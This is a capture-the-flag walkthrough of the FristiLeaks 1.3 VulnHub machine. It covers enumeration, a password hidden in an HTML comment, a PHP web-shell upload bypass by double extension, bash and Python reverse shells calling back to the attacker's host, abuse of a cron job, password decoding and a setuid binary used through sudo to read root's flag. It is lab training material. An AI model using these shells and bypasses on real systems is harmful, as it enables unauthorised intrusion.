# FristiLeaks 1.3

## Enumaration

- Port Scan

```
nmap -sC --script vuln 192.168.1.27 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-21 00:37 CEST
Nmap scan report for Host-007.homenet.telecomitalia.it (192.168.1.27)
Host is up (3.1s latency).
Not shown: 919 filtered tcp ports (no-response), 80 filtered tcp ports (host-unreach)
PORT   STATE SERVICE
80/tcp open  http
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-trace: TRACE is enabled
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /robots.txt: Robots file
|   /icons/: Potentially interesting folder w/ directory listing
|_  /images/: Potentially interesting folder w/ directory listing
|_http-csrf: Couldn't find any CSRF vulnerabilities.
```

- Directory discovery via gobuster

```
gobuster dir -u http://192.168.1.27 -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.27
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 206]
/.htaccess            (Status: 403) [Size: 211]
/.htpasswd            (Status: 403) [Size: 211]
/cgi-bin/             (Status: 403) [Size: 210]
/images               (Status: 301) [Size: 235] [--> http://192.168.1.27/images/]
/index.html           (Status: 200) [Size: 703]
/robots.txt           (Status: 200) [Size: 62]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

- Directory discovery via robots.txt: /cola, /sisi, /beer
- Guess Directory from homepage image: /fristi (???)

## Exploiting login page

- View the HTML code

``` html
<meta name="description" content="super leet password login-test page. We use base64 encoding for images so they are inline in the HTML. I read somewhere on the web, that thats a good way to do it.">
<!-- 
TODO:
We need to clean this up for production. I left some junk in here to make testing easier.

- by eezeepz
-->

<!-- 
iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACx
jwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0kl
S0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixw
B4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+f
m63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJ
Zv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvb
DpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNd
jJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU
12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5
uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg1
04VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLq
i1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2Fg
tOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws
30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl
3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HK
ul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12q
mD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34
rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFhe
EPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLH
AHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzk
CwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJR
U5ErkJggg==
-->
```

- eezeepz (user?)
- the base64 image is the password (use CyberChef)

## Exploiting the upload form

- only png,jpg,gif file are allower
- rename the webshell.php in webshell.php.png to bypass upload limitation
- open a listener for the reverse shell

``` bash
# my reverse shell code:
# <?php echo system($_GET['cmd']); ?>

# listener
nc -nlvp 1337

# reverse shell (encoded)
# %2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.23%2F1337%200%3E%261
wget http://192.168.1.27/fristi/uploads/kekshell.php.png?cmd=%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.23%2F1337%200%3E%261
```

## Post Exploitation

``` bash
bash-4.1$ id
uid=48(apache) gid=48(apache) groups=48(apache)
bash-4.1$ pwd
/var/www/html/fristi/uploads
bash-4.1$ ls -la
total 28
drwxrwxrwx. 2 apache apache 4096 Aug 20 19:36 .
drwxr-xr-x  3 apache apache 4096 Nov 17  2015 ..
-r--r--r--. 1 apache apache    4 Nov 17  2015 index.html
-rw-r--r--  1 apache apache 1213 Aug 20 19:14 kek.png
-rw-r--r--  1 apache apache   36 Aug 20 19:29 kekshell.php%00.jpg
-rw-r--r--  1 apache apache   36 Aug 20 19:27 kekshell.php%00.png
-rw-r--r--  1 apache apache   36 Aug 20 19:36 kekshell.php.png

bash-4.1$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
[...]
eezeepz:x:500:500::/home/eezeepz:/bin/bash
admin:x:501:501::/home/admin:/bin/bash
fristigod:x:502:502::/var/fristigod:/bin/bash
fristi:x:503:100::/var/www:/sbin/nologin
```

- home dir /home/eezeepz readable
- readable file notes.txt

```
cat /home/eezeepz/notes.txt
Yo EZ,

I made it possible for you to do some automated checks,
but I did only allow you access to /usr/bin/* system binaries. I did
however copy a few extra often needed commands to my
homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
from /home/admin/

Don't forget to specify the full path for each binary!

Just put a file called "runthis" in /tmp/, each line one command. The
output goes to the file "cronresult" in /tmp/. It should
run every minute with my account privileges.

- Jerry
```

- check for usable binary in /usr/bin

``` bash
ls -l /usr/bin
total 46700
# [...]
lrwxrwxrwx. 1 root root        14 Nov 17  2015 awk -> ../../bin/gawk
-rwxr-xr-x. 1 root root     29240 Nov 10  2015 base64
# [...]
-rwxr-xr-x. 1 root root    267888 Jul 22  2015 cpp
# [...]
-rwsr-xr-x. 1 root root     51784 Nov 10  2015 crontab
# [...]
-rwxr-xr-x. 1 root root    106168 Nov 10  2015 csplit
-rwxr-xr-x. 1 root root    119872 Jul 24  2015 curl
lrwxrwxrwx. 1 root root        13 Nov 17  2015 cut -> ../../bin/cut
# [...]
lrwxrwxrwx. 1 root root        14 Nov 17  2015 find -> ../../bin/find
# [...]
-rwxr-xr-x. 2 root root    263968 Jul 22  2015 gcc
# [...]
-rwxr-xr-x. 2 root root      7184 Nov 10  2015 perl
-rwxr-xr-x. 2 root root      7184 Nov 10  2015 perl5.10.1
-rwxr-xr-x. 2 root root     44726 Nov 10  2015 perlbug
-rwxr-xr-x. 1 root root       224 Nov 10  2015 perldoc
-rwxr-xr-x. 2 root root     44726 Nov 10  2015 perlthanks
# [...]
-rwxr-xr-x. 1 root root   3232368 Jul  9  2015 php
-rwxr-xr-x. 1 root root   3243504 Jul  9  2015 php-cgi
# [...]
-rwxr-xr-x. 1 root root        78 Jul 23  2015 pydoc
-rwxr-xr-x. 2 root root      4864 Jul 23  2015 python
lrwxrwxrwx. 1 root root         6 Nov 17  2015 python2 -> python
-rwxr-xr-x. 2 root root      4864 Jul 23  2015 python2.6
# [...]
```

- try to create perl reverse shell in /tmp/runthis

```
```

- try to create a python reverse shell in /tmp/tunthis

``` bash
/usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.23",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

- get TTy and explore the /home/admin

``` bash
sh-4.1$ sudo su
sudo su
sudo: sorry, you must have a tty to run sudo
sh-4.1$ /usr/bin/python -c 'import pty; pty.spawn("/bin/bash")'
/usr/bin/python -c 'import pty; pty.spawn("/bin/bash")'
[admin@Host-007 ~]$ s -l
ls -l
total 632
-rwxr-xr-x 1 admin     admin      45224 Nov 18  2015 cat
-rwxr-xr-x 1 admin     admin      48712 Nov 18  2015 chmod
-rw-r--r-- 1 admin     admin        737 Nov 18  2015 cronjob.py
-rw-r--r-- 1 admin     admin         21 Nov 18  2015 cryptedpass.txt
-rw-r--r-- 1 admin     admin        258 Nov 18  2015 cryptpass.py
-rwxr-xr-x 1 admin     admin      90544 Nov 18  2015 df
-rwxr-xr-x 1 admin     admin      24136 Nov 18  2015 echo
-rwxr-xr-x 1 admin     admin     163600 Nov 18  2015 egrep
-rwxr-xr-x 1 admin     admin     163600 Nov 18  2015 grep
-rwxr-xr-x 1 admin     admin      85304 Nov 18  2015 ps
-rw-r--r-- 1 fristigod fristigod     25 Nov 19  2015 whoisyourgodnow.txt
[admin@Host-007 ~]$ cat cryptedpass.txt     # admin password
mVGZ3O3omkJLmy2pcuTq
[admin@Host-007 ~]$ cat whoisyourgodnow.txt # fristigod password
=RFn0AKnlMHMPIzpyuTI0ITG
```

- crypt script cryptpass.py

``` python
#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
import base64,codecs,sys

def encodeString(str):
    base64string= base64.b64encode(str)                 # base64
    return codecs.encode(base64string[::-1], 'rot13')   # rot13

cryptoResult=encodeString(sys.argv[1])
print cryptoResult
```

- my decrypt script:

``` python
import base64, codecs

def decodeStr(string):
	rot13string = codecs.decode(string, 'rot13')
	base64string = rot13string[::-1]                    # retrives base64 from rot13
	password = base64.b64decode(base64string)           # retrives password from base64
	return password

encoded_string = "mVGZ3O3omkJLmy2pcuTq"     # change this string
decoded_string = decodeStr(encoded_string)
print(decoded_string.decode('utf-8'))
```

- switch user to fristigod and explore /home/fristigod

``` bash
su - fristigod
Password: LetThereBeFristi!

-bash-4.1$ id
uid=502(fristigod) gid=502(fristigod) groups=502(fristigod)
-bash-4.1$ pwd
/var/fristigod
-bash-4.1$ ls -la
total 16
drwxr-x---   3 fristigod fristigod 4096 Nov 25  2015 .
drwxr-xr-x. 19 root      root      4096 Nov 19  2015 ..
-rw-------   1 fristigod fristigod  864 Nov 25  2015 .bash_history
drwxrwxr-x.  2 fristigod fristigod 4096 Nov 25  2015 .secret_admin_stuff
-bash-4.1$ cd .secret_admin_stuff
-bash-4.1$ ls -la
total 16
drwxrwxr-x. 2 fristigod fristigod 4096 Nov 25  2015 .
drwxr-x---  3 fristigod fristigod 4096 Nov 25  2015 ..
-rwsr-sr-x  1 root      root      7529 Nov 25  2015 doCom       # not exe from fristigod
```

- after a few minutes I realized that the bash_history file had some suggestions

``` bash
-bash-4.1$ cat .bash_history
ls
pwd
ls -lah
cd .secret_admin_stuff/
ls
./doCom
./doCom test
sudo ls
exit
cd .secret_admin_stuff/
ls
./doCom
sudo -u fristi ./doCom ls / ####################################### fristi is the auth user
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
exit
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
exit
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
# [...]
-bash-4.1$ sudo -u fristi ./doCom ls /
[sudo] password for fristigod: LetThereBeFristi!
bin   dev  home  lib64	     media  opt   root	selinux  sys  usr
boot  etc  lib	 lost+found  mnt    proc  sbin	srv	 tmp  var

-bash-4.1$ sudo -u fristi ./doCom ls /root
fristileaks_secrets.txt

-bash-4.1$ sudo -u fristi ./doCom cat /root/fristileaks_secrets.txt
Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]
I wonder if you beat it in the maximum 4 hours it's supposed to take!
Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)

Flag: Y0u_kn0w_y0u_l0ve_fr1st1
```
